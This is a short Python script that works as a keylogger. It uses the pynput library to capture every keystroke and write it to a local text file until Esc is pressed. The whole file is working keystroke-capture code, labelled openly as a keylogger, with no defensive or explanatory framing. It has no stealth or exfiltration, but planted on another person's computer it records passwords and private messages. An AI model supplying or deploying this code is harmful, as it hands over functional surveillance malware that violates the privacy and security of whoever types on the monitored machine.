from pynput import keyboard

# File to store the logged keys
LOG_FILE = "key_log.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as log_file:
            # Handle alphanumeric keys
            if hasattr(key, 'char') and key.char is not None:
                log_file.write(key.char)
            # Handle special keys
            else:
                log_file.write(f"<{key.name}>")
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    # Stop listener when 'esc' is pressed
    if key == keyboard.Key.esc:
        return False

# Main function to start the keylogger
def main():
    print("Keylogger started. Press 'Esc' to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
